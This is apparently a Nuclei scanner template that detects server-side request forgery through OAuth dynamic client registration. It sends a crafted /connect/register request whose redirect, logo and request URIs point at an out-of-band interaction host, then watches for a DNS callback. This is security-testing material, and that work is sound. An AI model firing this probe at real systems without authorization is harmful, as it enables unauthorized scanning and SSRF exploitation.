http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  raw:
  - "POST /connect/register HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\
    Accept-Language: en-US,en;q=0.9\n\n{\n  \"application_type\": \"web\",\n  \"redirect_uris\"\
    : [\"https://{{interactsh-url}}/callback\"],\n  \"client_name\": \"{{Hostname}}\"\
    ,\n  \"logo_uri\": \"https://{{interactsh-url}}/favicon.ico\",\n  \"subject_type\"\
    : \"pairwise\",\n  \"token_endpoint_auth_method\": \"client_secret_basic\",\n\
    \  \"request_uris\": [\"https://{{interactsh-url}}\"]\n}\n"
id: ssrf-via-oauth-misconfig
info:
  author: KabirSuda
  description: Sends a POST request with the endpoint "/connect/register" to check
    external Interaction with multiple POST parameters.
  metadata:
    max-request: 1
  name: SSRF due to misconfiguration in OAuth
  reference:
  - https://portswigger.net/research/hidden-oauth-attack-vectors
  severity: medium
  tags: misconfig,oast,oauth,ssrf,intrusive
